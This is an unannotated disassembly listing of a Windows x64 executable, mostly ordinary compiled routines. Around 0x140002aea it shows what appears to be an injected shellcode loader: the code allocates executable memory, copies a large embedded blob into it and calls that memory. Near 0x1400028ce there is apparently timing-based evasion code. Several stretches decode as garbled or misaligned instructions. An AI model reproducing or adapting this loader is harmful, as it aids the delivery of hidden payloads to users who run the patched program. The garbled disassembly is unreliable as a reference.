   140002669:	48 8d 0d 10 3f 08 00 	lea    0x83f10(%rip),%rcx        # 0x140086580
   140002670:	e8 eb 94 03 00       	call   0x14003bb60
   140002675:	48 8d 0d c4 0b 06 00 	lea    0x60bc4(%rip),%rcx        # 0x140063240
   14000267c:	48 83 c4 28          	add    $0x28,%rsp
   140002680:	e9 ab a1 0f 85       	jmp    0xc50fc830
   140002685:	0b fe                	or     %esi,%edi
   140002687:	ff                   	(bad)
   140002688:	ff                   	ljmp   (bad)
   140002689:	e8 11 02 00 00       	call   0x14000289f
   14000268e:	e9 57 04 00 00       	jmp    0x140002aea
   140002693:	58                   	pop    %rax
   140002694:	48 8d 05 4d 8a 06 00 	lea    0x68a4d(%rip),%rax        # 0x14006b0e8
   14000269b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400026a0:	48 c7 44 24 48 25 00 	movq   $0x25,0x48(%rsp)
   1400026a7:	00 00 
   1400026a9:	b8 00 80 00 00       	mov    $0x8000,%eax
   1400026ae:	66 21 05 45 1b 08 00 	and    %ax,0x81b45(%rip)        # 0x1400841fa
   1400026b5:	48 8d 05 54 8a 06 00 	lea    0x68a54(%rip),%rax        # 0x14006b110
   1400026bc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400026c1:	48 c7 44 24 28 15 00 	movq   $0x15,0x28(%rsp)
   1400026c8:	00 00 
   1400026ca:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400026cf:	66 0f 7f 44 24 20    	movdqa %xmm0,0x20(%rsp)
   1400026d5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400026da:	48 8d 0d 0f 1b 08 00 	lea    0x81b0f(%rip),%rcx        # 0x1400841f0
   1400026e1:	e8 0a 55 02 00       	call   0x140027bf0
   1400026e6:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   1400026eb:	0f 29 05 1e 1b 08 00 	movaps %xmm0,0x81b1e(%rip)        # 0x140084210
   1400026f2:	48 83 3d 76 1b 08 00 	cmpq   $0x0,0x81b76(%rip)        # 0x140084270
   1400026f9:	00 
   1400026fa:	74 3f                	je     0x14000273b
   1400026fc:	66 c7 44 24 30 03 01 	movw   $0x103,0x30(%rsp)
   140002703:	48 8d 05 2e 4a 06 00 	lea    0x64a2e(%rip),%rax        # 0x140067138
   14000270a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000270f:	33 c0                	xor    %eax,%eax
   140002711:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002716:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000271b:	e8 e0 3f 03 00       	call   0x140036700
   140002720:	4c 8b c8             	mov    %rax,%r9
   140002723:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002728:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000272d:	48 8d 0d bc 1a 08 00 	lea    0x81abc(%rip),%rcx        # 0x1400841f0
   140002734:	e8 37 2c 02 00       	call   0x140025370
   140002739:	eb 22                	jmp    0x14000275d
   14000273b:	48 8d 05 ae 3f 08 00 	lea    0x83fae(%rip),%rax        # 0x1400866f0
   140002742:	48 89 05 27 1b 08 00 	mov    %rax,0x81b27(%rip)        # 0x140084270
   140002749:	c6 05 31 1b 08 00 01 	movb   $0x1,0x81b31(%rip)        # 0x140084281
   140002750:	0f b6 05 99 3f 08 00 	movzbl 0x83f99(%rip),%eax        # 0x1400866f0
   140002757:	88 05 23 1b 08 00    	mov    %al,0x81b23(%rip)        # 0x140084280
   14000275d:	0f b7 05 96 1a 08 00 	movzwl 0x81a96(%rip),%eax        # 0x1400841fa
   140002764:	ba bf ff 00 00       	mov    $0xffbf,%edx
   140002769:	66 23 c2             	and    %dx,%ax
   14000276c:	66 83 c8 20          	or     $0x20,%ax
   140002770:	66 89 05 83 1a 08 00 	mov    %ax,0x81a83(%rip)        # 0x1400841fa
   140002777:	48 8d 0d 72 1a 08 00 	lea    0x81a72(%rip),%rcx        # 0x1400841f0
   14000277e:	e8 fd 1d 02 00       	call   0x140024580
   140002783:	90                   	nop
   140002784:	48 8d 0d e5 0a 06 00 	lea    0x60ae5(%rip),%rcx        # 0x140063270
   14000278b:	48 83 c4 58          	add    $0x58,%rsp
   14000278f:	e9 9c a0 03 00       	jmp    0x14003c830
   140002794:	cc                   	int3
   140002795:	cc                   	int3
   140002796:	cc                   	int3
   140002797:	cc                   	int3
   140002798:	cc                   	int3
   140002799:	cc                   	int3
   14000279a:	cc                   	int3
   14000279b:	cc                   	int3
   14000279c:	cc                   	int3
   14000279d:	cc                   	int3
   14000279e:	cc                   	int3
   14000279f:	cc                   	int3
   1400027a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400027a4:	48 8d 0d b5 40 08 00 	lea    0x840b5(%rip),%rcx        # 0x140086860
   1400027ab:	e8 f0 7f 03 00       	call   0x14003a7a0
   1400027b0:	48 8d 0d 09 0b 06 00 	lea    0x60b09(%rip),%rcx        # 0x1400632c0
   1400027b7:	48 83 c4 28          	add    $0x28,%rsp
   1400027bb:	e9 70 a0 03 00       	jmp    0x14003c830
   1400027c0:	48 8d 0d 69 0b 06 00 	lea    0x60b69(%rip),%rcx        # 0x140063330
   1400027c7:	e9 64 a0 03 00       	jmp    0x14003c830
   1400027cc:	cc                   	int3
   1400027cd:	cc                   	int3
   1400027ce:	cc                   	int3
   1400027cf:	cc                   	int3
   1400027d0:	48 8d 0d f9 0a 06 00 	lea    0x60af9(%rip),%rcx        # 0x1400632d0
   1400027d7:	e9 54 a0 03 00       	jmp    0x14003c830
   1400027dc:	cc                   	int3
   1400027dd:	cc                   	int3
   1400027de:	cc                   	int3
   1400027df:	cc                   	int3
   1400027e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400027e4:	48 8d 0d f5 42 08 00 	lea    0x842f5(%rip),%rcx        # 0x140086ae0
   1400027eb:	e8 b0 7f 03 00       	call   0x14003a7a0
   1400027f0:	48 8d 0d b9 0b 06 00 	lea    0x60bb9(%rip),%rcx        # 0x1400633b0
   1400027f7:	48 83 c4 28          	add    $0x28,%rsp
   1400027fb:	e9 30 a0 03 00       	jmp    0x14003c830
   140002800:	48 8d 0d 69 0b 06 00 	lea    0x60b69(%rip),%rcx        # 0x140063370
   140002807:	e9 24 a0 03 00       	jmp    0x14003c830
   14000280c:	cc                   	int3
   14000280d:	cc                   	int3
   14000280e:	cc                   	int3
   14000280f:	cc                   	int3
   140002810:	48 83 ec 58          	sub    $0x58,%rsp
   140002814:	33 c0                	xor    %eax,%eax
   140002816:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   14000281b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002820:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002825:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002829:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000282e:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002832:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002837:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000283b:	e8 30 30 00 00       	call   0x140005870
   140002840:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140002845:	48 83 c4 58          	add    $0x58,%rsp
   140002849:	c3                   	ret
   14000284a:	cc                   	int3
   14000284b:	cc                   	int3
   14000284c:	cc                   	int3
   14000284d:	cc                   	int3
   14000284e:	cc                   	int3
   14000284f:	cc                   	int3
   140002850:	48 83 ec 28          	sub    $0x28,%rsp
   140002854:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002859:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000285e:	e8 9d 32 00 00       	call   0x140005b00
   140002863:	48 83 c4 28          	add    $0x28,%rsp
   140002867:	c3                   	ret
   140002868:	cc                   	int3
   140002869:	cc                   	int3
   14000286a:	cc                   	int3
   14000286b:	cc                   	int3
   14000286c:	cc                   	int3
   14000286d:	cc                   	int3
   14000286e:	cc                   	int3
   14000286f:	cc                   	int3
   140002870:	48 83 ec 28          	sub    $0x28,%rsp
   140002874:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140002878:	c7 01 ee 03 00 00    	movl   $0x3ee,(%rcx)
   14000287e:	48 85 c0             	test   %rax,%rax
   140002881:	74 48                	je     0x1400028cb
   140002883:	44 8b 41 04          	mov    0x4(%rcx),%r8d
   140002887:	49 c1 e0 02          	shl    $0x2,%r8
   14000288b:	49 83 f8 18          	cmp    $0x18,%r8
   14000288f:	72 1c                	jb     0x1400028ad
   140002891:	0f 10 05 28 24 06 00 	movups 0x62428(%rip),%xmm0        # 0x140064cc0
   140002898:	0f 11 00             	movups %xmm0,(%rax)
   14000289b:	f2 0f 10 48 83       	movsd  -0x7d(%rax),%xmm1
   1400028a0:	ec                   	in     (%dx),%al
   1400028a1:	38 e8                	cmp    %ch,%al
   1400028a3:	27                   	(bad)
   1400028a4:	00 00                	add    %al,(%rax)
   1400028a6:	00 89 44 24 20 e8    	add    %cl,-0x17dfdbbc(%rcx)
   1400028ac:	1e                   	(bad)
   1400028ad:	00 00                	add    %al,(%rax)
   1400028af:	00 2b                	add    %ch,(%rbx)
   1400028b1:	44 24 20             	rex.R and $0x20,%al
   1400028b4:	3d b8 0b 00 00       	cmp    $0xbb8,%eax
   1400028b9:	73 02                	jae    0x1400028bd
   1400028bb:	eb ee                	jmp    0x1400028ab
   1400028bd:	48 83 c4 38          	add    $0x38,%rsp
   1400028c1:	c3                   	ret
   1400028c2:	cc                   	int3
   1400028c3:	cc                   	int3
   1400028c4:	cc                   	int3
   1400028c5:	cc                   	int3
   1400028c6:	cc                   	int3
   1400028c7:	cc                   	int3
   1400028c8:	cc                   	int3
   1400028c9:	cc                   	int3
   1400028ca:	cc                   	int3
   1400028cb:	cc                   	int3
   1400028cc:	cc                   	int3
   1400028cd:	cc                   	int3
   1400028ce:	48 83 ec 28          	sub    $0x28,%rsp
   1400028d2:	48 c7 44 24 08 04 00 	movq   $0x7ffe0004,0x8(%rsp)
   1400028d9:	fe 7f 
   1400028db:	48 c7 44 24 10 24 03 	movq   $0x7ffe0324,0x10(%rsp)
   1400028e2:	fe 7f 
   1400028e4:	48 c7 44 24 18 20 03 	movq   $0x7ffe0320,0x18(%rsp)
   1400028eb:	fe 7f 
   1400028ed:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
   1400028f2:	8b 00                	mov    (%rax),%eax
   1400028f4:	c1 e0 08             	shl    $0x8,%eax
   1400028f7:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400028fc:	8b 09                	mov    (%rcx),%ecx
   1400028fe:	0f af c8             	imul   %eax,%ecx
   140002901:	8b c1                	mov    %ecx,%eax
   140002903:	8b c0                	mov    %eax,%eax
   140002905:	48 8b 4c 24 18       	mov    0x18(%rsp),%rcx
   14000290a:	8b 09                	mov    (%rcx),%ecx
   14000290c:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
   140002911:	8b 12                	mov    (%rdx),%edx
   140002913:	48 0f af ca          	imul   %rdx,%rcx
   140002917:	48 c1 e9 18          	shr    $0x18,%rcx
   14000291b:	48 03 c1             	add    %rcx,%rax
   14000291e:	89 04 24             	mov    %eax,(%rsp)
   140002921:	8b 04 24             	mov    (%rsp),%eax
   140002924:	48 83 c4 28          	add    $0x28,%rsp
   140002928:	c3                   	ret
   140002929:	ff                   	(bad)
   14000292a:	ff                   	(bad)
   14000292b:	ff                   	(bad)
   14000292c:	ff                   	(bad)
   14000292d:	ff                   	(bad)
   14000292e:	7f 48                	jg     0x140002978
   140002930:	3b f5                	cmp    %ebp,%esi
   140002932:	0f 87 86 00 00 00    	ja     0x1400029be
   140002938:	0f ae e8             	lfence
   14000293b:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   140002942:	00 
   140002943:	48 83 fe 10          	cmp    $0x10,%rsi
   140002947:	73 0e                	jae    0x140002957
   140002949:	4c 8b c6             	mov    %rsi,%r8
   14000294c:	48 89 71 10          	mov    %rsi,0x10(%rcx)
   140002950:	e8 7b aa 03 00       	call   0x14003d3d0
   140002955:	eb 4e                	jmp    0x1400029a5
   140002957:	48 8b c6             	mov    %rsi,%rax
   14000295a:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000295f:	48 83 c8 0f          	or     $0xf,%rax
   140002963:	48 3b c5             	cmp    %rbp,%rax
   140002966:	77 0f                	ja     0x140002977
   140002968:	b9 16 00 00 00       	mov    $0x16,%ecx
   14000296d:	48 8b e8             	mov    %rax,%rbp
   140002970:	48 3b c1             	cmp    %rcx,%rax
   140002973:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140002977:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   14000297b:	e8 a0 04 00 00       	call   0x140002e20
   140002980:	4c 8b c6             	mov    %rsi,%r8
   140002983:	48 89 07             	mov    %rax,(%rdi)
   140002986:	49 8b d6             	mov    %r14,%rdx
   140002989:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   14000298d:	48 8b c8             	mov    %rax,%rcx
   140002990:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   140002994:	48 8b d8             	mov    %rax,%rbx
   140002997:	e8 34 aa 03 00       	call   0x14003d3d0
   14000299c:	c6 04 33 00          	movb   $0x0,(%rbx,%rsi,1)
   1400029a0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400029a5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400029aa:	48 8b c7             	mov    %rdi,%rax
   1400029ad:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400029b2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400029b7:	48 83 c4 20          	add    $0x20,%rsp
   1400029bb:	41 5e                	pop    %r14
   1400029bd:	c3                   	ret
   1400029be:	e8 ad 81 00 00       	call   0x14000ab70
   1400029c3:	cc                   	int3
   1400029c4:	cc                   	int3
   1400029c5:	cc                   	int3
   1400029c6:	cc                   	int3
   1400029c7:	cc                   	int3
   1400029c8:	cc                   	int3
   1400029c9:	cc                   	int3
   1400029ca:	cc                   	int3
   1400029cb:	cc                   	int3
   1400029cc:	cc                   	int3
   1400029cd:	cc                   	int3
   1400029ce:	cc                   	int3
   1400029cf:	cc                   	int3
   1400029d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400029d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400029da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400029df:	57                   	push   %rdi
   1400029e0:	41 56                	push   %r14
   1400029e2:	41 57                	push   %r15
   1400029e4:	48 83 ec 40          	sub    $0x40,%rsp
   1400029e8:	48 8b f2             	mov    %rdx,%rsi
   1400029eb:	48 8b d9             	mov    %rcx,%rbx
   1400029ee:	45 33 ff             	xor    %r15d,%r15d
   1400029f1:	45 32 f6             	xor    %r14b,%r14b
   1400029f4:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400029f9:	48 8b 01             	mov    (%rcx),%rax
   1400029fc:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140002a00:	49 8b 4c 08 48       	mov    0x48(%r8,%rcx,1),%rcx
   140002a05:	48 85 c9             	test   %rcx,%rcx
   140002a08:	74 0e                	je     0x140002a18
   140002a0a:	48 8b 01             	mov    (%rcx),%rax
   140002a0d:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002a11:	ff 15 a9 19 06 00    	call   *0x619a9(%rip)        # 0x1400643c0
   140002a17:	90                   	nop
   140002a18:	33 d2                	xor    %edx,%edx
   140002a1a:	48 8b cb             	mov    %rbx,%rcx
   140002a1d:	e8 7e 7e 00 00       	call   0x14000a8a0
   140002a22:	88 44 24 28          	mov    %al,0x28(%rsp)
   140002a26:	84 c0                	test   %al,%al
   140002a28:	0f 84 11 01 00 00    	je     0x140002b3f
   140002a2e:	48 8b 03             	mov    (%rbx),%rax
   140002a31:	48 63 40 04          	movslq 0x4(%rax),%rax
   140002a35:	48 8b 44 18 40       	mov    0x40(%rax,%rbx,1),%rax
   140002a3a:	48 8b 78 08          	mov    0x8(%rax),%rdi
   140002a3e:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140002a43:	48 8b 07             	mov    (%rdi),%rax
   140002a46:	48 8b cf             	mov    %rdi,%rcx
   140002a49:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002a4d:	ff 15 6d 19 06 00    	call   *0x6196d(%rip)        # 0x1400643c0
   140002a53:	90                   	nop
   140002a54:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002a59:	e8 32 0c 00 00       	call   0x140003690
   140002a5e:	48 8b e8             	mov    %rax,%rbp
   140002a61:	48 85 ff             	test   %rdi,%rdi
   140002a64:	74 2c                	je     0x140002a92
   140002a66:	48 8b 17             	mov    (%rdi),%rdx
   140002a69:	48 8b cf             	mov    %rdi,%rcx
   140002a6c:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140002a70:	ff 15 4a 19 06 00    	call   *0x6194a(%rip)        # 0x1400643c0
   140002a76:	4c 8b c0             	mov    %rax,%r8
   140002a79:	48 85 c0             	test   %rax,%rax
   140002a7c:	74 14                	je     0x140002a92
   140002a7e:	48 8b 08             	mov    (%rax),%rcx
   140002a81:	48 8b 01             	mov    (%rcx),%rax
   140002a84:	ba 01 00 00 00       	mov    $0x1,%edx
   140002a89:	49 8b c8             	mov    %r8,%rcx
   140002a8c:	ff 15 2e 19 06 00    	call   *0x6192e(%rip)        # 0x1400643c0
   140002a92:	48 8b c6             	mov    %rsi,%rax
   140002a95:	48 83 7e 18 10       	cmpq   $0x10,0x18(%rsi)
   140002a9a:	72 03                	jb     0x140002a9f
   140002a9c:	48 8b 06             	mov    (%rsi),%rax
   140002a9f:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
   140002aa6:	00 
   140002aa7:	c6 00 00             	movb   $0x0,(%rax)
   140002aaa:	48 8b 03             	mov    (%rbx),%rax
   140002aad:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002ab1:	48 8b 7c 19 28       	mov    0x28(%rcx,%rbx,1),%rdi
   140002ab6:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140002abd:	ff ff 7f 
   140002ac0:	48 85 ff             	test   %rdi,%rdi
   140002ac3:	7e 05                	jle    0x140002aca
   140002ac5:	48 3b f8             	cmp    %rax,%rdi
   140002ac8:	72 03                	jb     0x140002acd
   140002aca:	48 8b f8             	mov    %rax,%rdi
   140002acd:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   140002ad2:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140002ad6:	48 8b 10             	mov    (%rax),%rdx
   140002ad9:	48 85 d2             	test   %rdx,%rdx
   140002adc:	74 0e                	je     0x140002aec
   140002ade:	48 8b 41 50          	mov    0x50(%rcx),%rax
   140002ae2:	83 38 00             	cmpl   $0x0,(%rax)
   140002ae5:	7e 05                	jle    0x140002aec
   140002ae7:	0f b6 02             	movzbl (%rdx),%eax
   140002aea:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   140002af1:	48 33 c9             	xor    %rcx,%rcx
   140002af4:	48 c7 c2 8f e6 04 00 	mov    $0x4e68f,%rdx
   140002afb:	49 c7 c0 00 10 00 00 	mov    $0x1000,%r8
   140002b02:	49 c7 c1 40 00 00 00 	mov    $0x40,%r9
   140002b09:	48 ff 15 e8 2e 03 00 	rex.W call *0x32ee8(%rip)        # 0x1400359f8
   140002b10:	48 85 c0             	test   %rax,%rax
   140002b13:	0f 84 43 01 00 00    	je     0x140002c5c
   140002b19:	48 8b f8             	mov    %rax,%rdi
   140002b1c:	e8 00 00 00 00       	call   0x140002b21
   140002b21:	5e                   	pop    %rsi
   140002b22:	48 81 c6 3f 4b 04 00 	add    $0x44b3f,%rsi
   140002b29:	48 c7 c1 8f e6 04 00 	mov    $0x4e68f,%rcx
   140002b30:	f3 a4                	rep movsb (%rsi),(%rdi)
   140002b32:	ff d0                	call   *%rax
   140002b34:	01 75 c9             	add    %esi,-0x37(%rbp)
   140002b37:	eb 06                	jmp    0x140002b3f
   140002b39:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140002b3f:	48 8b 03             	mov    (%rbx),%rax
   140002b42:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002b46:	48 c7 44 19 28 00 00 	movq   $0x0,0x28(%rcx,%rbx,1)
   140002b4d:	00 00 
   140002b4f:	48 8b 03             	mov    (%rbx),%rax
   140002b52:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002b56:	48 03 cb             	add    %rbx,%rcx
   140002b59:	41 8b d7             	mov    %r15d,%edx
   140002b5c:	83 ca 02             	or     $0x2,%edx
   140002b5f:	45 84 f6             	test   %r14b,%r14b
   140002b62:	41 0f 45 d7          	cmovne %r15d,%edx
   140002b66:	45 33 c0             	xor    %r8d,%r8d
   140002b69:	e8 d2 8f 00 00       	call   0x14000bb40
   140002b6e:	90                   	nop
   140002b6f:	48 8b 03             	mov    (%rbx),%rax
   140002b72:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002b76:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   140002b7b:	48 85 c9             	test   %rcx,%rcx
   140002b7e:	74 0e                	je     0x140002b8e
   140002b80:	48 8b 01             	mov    (%rcx),%rax
   140002b83:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002b87:	ff 15 33 18 06 00    	call   *0x61833(%rip)        # 0x1400643c0
   140002b8d:	90                   	nop
   140002b8e:	48 8b c3             	mov    %rbx,%rax
   140002b91:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140002b96:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140002b9b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140002ba0:	48 83 c4 40          	add    $0x40,%rsp
   140002ba4:	41 5f                	pop    %r15
   140002ba6:	41 5e                	pop    %r14
   140002ba8:	5f                   	pop    %rdi
   140002ba9:	c3                   	ret
   140002baa:	cc                   	int3
   140002bab:	cc                   	int3
   140002bac:	cc                   	int3
   140002bad:	cc                   	int3
   140002bae:	cc                   	int3
   140002baf:	cc                   	int3
   140002bb0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002bb5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002bba:	56                   	push   %rsi
   140002bbb:	57                   	push   %rdi
   140002bbc:	41 56                	push   %r14
   140002bbe:	48 83 ec 30          	sub    $0x30,%rsp
   140002bc2:	4c 8b f2             	mov    %rdx,%r14
   140002bc5:	48 8b f9             	mov    %rcx,%rdi
   140002bc8:	33 ed                	xor    %ebp,%ebp
   140002bca:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
   140002bd1:	48 ff c6             	inc    %rsi
   140002bd4:	40 38 2c 32          	cmp    %bpl,(%rdx,%rsi,1)
   140002bd8:	75 f7                	jne    0x140002bd1
   140002bda:	48 8b 01             	mov    (%rcx),%rax
   140002bdd:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002be1:	48 8b 5c 39 28       	mov    0x28(%rcx,%rdi,1),%rbx
   140002be6:	48 85 db             	test   %rbx,%rbx
   140002be9:	7e 0a                	jle    0x140002bf5
   140002beb:	48 3b de             	cmp    %rsi,%rbx
   140002bee:	7e 05                	jle    0x140002bf5
   140002bf0:	48 2b de             	sub    %rsi,%rbx
   140002bf3:	eb 02                	jmp    0x140002bf7
   140002bf5:	33 db                	xor    %ebx,%ebx
   140002bf7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002bfc:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002c01:	48 85 c9             	test   %rcx,%rcx
   140002c04:	74 0e                	je     0x140002c14
   140002c06:	48 8b 01             	mov    (%rcx),%rax
   140002c09:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002c0d:	ff 15 ad 17 06 00    	call   *0x617ad(%rip)        # 0x1400643c0
   140002c13:	90                   	nop
   140002c14:	48 8b 0f             	mov    (%rdi),%rcx
   140002c17:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140002c1b:	83 7c 38 10 00       	cmpl   $0x0,0x10(%rax,%rdi,1)
   140002c20:	74 04                	je     0x140002c26
   140002c22:	32 c0                	xor    %al,%al
   140002c24:	eb 2a                	jmp    0x140002c50
   140002c26:	48 8b 44 38 50       	mov    0x50(%rax,%rdi,1),%rax
   140002c2b:	48 85 c0             	test   %rax,%rax
   140002c2e:	74 1e                	je     0x140002c4e
   140002c30:	48 3b c7             	cmp    %rdi,%rax
   140002c33:	74 19                	je     0x140002c4e
   140002c35:	48 8b c8             	mov    %rax,%rcx
   140002c38:	e8 e3 83 00 00       	call   0x14000b020
   140002c3d:	48 8b 0f             	mov    (%rdi),%rcx
   140002c40:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140002c44:	83 7c 38 10 00       	cmpl   $0x0,0x10(%rax,%rdi,1)
   140002c49:	0f 94 c0             	sete   %al
   140002c4c:	eb 02                	jmp    0x140002c50
   140002c4e:	b0 01                	mov    $0x1,%al
   140002c50:	88 44 24 28          	mov    %al,0x28(%rsp)
   140002c54:	84 c0                	test   %al,%al
   140002c56:	75 0a                	jne    0x140002c62
   140002c58:	bd 04 00 00 00       	mov    $0x4,%ebp
   140002c5d:	e9 2a 01 00 00       	jmp    0x140002d8c
   140002c62:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140002c66:	8b 4c 38 18          	mov    0x18(%rax,%rdi,1),%ecx
   140002c6a:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   140002c70:	83 f9 40             	cmp    $0x40,%ecx
   140002c73:	74 6b                	je     0x140002ce0
   140002c75:	48 85 db             	test   %rbx,%rbx
   140002c78:	7e 66                	jle    0x140002ce0
   140002c7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002c80:	48 8b 07             	mov    (%rdi),%rax
   140002c83:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002c87:	4c 8b 44 39 48       	mov    0x48(%rcx,%rdi,1),%r8
   140002c8c:	44 0f b6 4c 39 58    	movzbl 0x58(%rcx,%rdi,1),%r9d
   140002c92:	49 8b 40 40          	mov    0x40(%r8),%rax
   140002c96:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002c9a:	74 24                	je     0x140002cc0
   140002c9c:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140002ca0:	8b 01                	mov    (%rcx),%eax
   140002ca2:	85 c0                	test   %eax,%eax
   140002ca4:	7e 1a                	jle    0x140002cc0
   140002ca6:	ff c8                	dec    %eax
   140002ca8:	89 01                	mov    %eax,(%rcx)
   140002caa:	49 8b 48 40          	mov    0x40(%r8),%rcx
   140002cae:	48 8b 11             	mov    (%rcx),%rdx
   140002cb1:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140002cb5:	48 89 01             	mov    %rax,(%rcx)
   140002cb8:	44 88 0a             	mov    %r9b,(%rdx)
   140002cbb:	41 8b c1             	mov    %r9d,%eax
   140002cbe:	eb 13                	jmp    0x140002cd3
   140002cc0:	49 8b 00             	mov    (%r8),%rax
   140002cc3:	41 8b d1             	mov    %r9d,%edx
   140002cc6:	49 8b c8             	mov    %r8,%rcx
   140002cc9:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002ccd:	ff 15 ed 16 06 00    	call   *0x616ed(%rip)        # 0x1400643c0
   140002cd3:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002cd6:	74 78                	je     0x140002d50
   140002cd8:	48 ff cb             	dec    %rbx
   140002cdb:	48 85 db             	test   %rbx,%rbx
   140002cde:	7f a0                	jg     0x140002c80
   140002ce0:	48 8b 07             	mov    (%rdi),%rax
   140002ce3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002ce7:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002cec:	48 8b 01             	mov    (%rcx),%rax
   140002cef:	4c 8b c6             	mov    %rsi,%r8
   140002cf2:	49 8b d6             	mov    %r14,%rdx
   140002cf5:	48 8b 40 48          	mov    0x48(%rax),%rax
   140002cf9:	ff 15 c1 16 06 00    	call   *0x616c1(%rip)        # 0x1400643c0
   140002cff:	48 3b c6             	cmp    %rsi,%rax
   140002d02:	75 75                	jne    0x140002d79
   140002d04:	48 85 db             	test   %rbx,%rbx
   140002d07:	7e 73                	jle    0x140002d7c
   140002d09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002d10:	48 8b 07             	mov    (%rdi),%rax
   140002d13:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002d17:	4c 8b 44 39 48       	mov    0x48(%rcx,%rdi,1),%r8
   140002d1c:	44 0f b6 4c 39 58    	movzbl 0x58(%rcx,%rdi,1),%r9d
   140002d22:	49 8b 40 40          	mov    0x40(%r8),%rax
   140002d26:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002d2a:	74 2b                	je     0x140002d57
   140002d2c:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140002d30:	8b 01                	mov    (%rcx),%eax
   140002d32:	85 c0                	test   %eax,%eax
   140002d34:	7e 21                	jle    0x140002d57
   140002d36:	ff c8                	dec    %eax
   140002d38:	89 01                	mov    %eax,(%rcx)
   140002d3a:	49 8b 48 40          	mov    0x40(%r8),%rcx
   140002d3e:	48 8b 11             	mov    (%rcx),%rdx
   140002d41:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140002d45:	48 89 01             	mov    %rax,(%rcx)
   140002d48:	44 88 0a             	mov    %r9b,(%rdx)
   140002d4b:	41 8b c1             	mov    %r9d,%eax
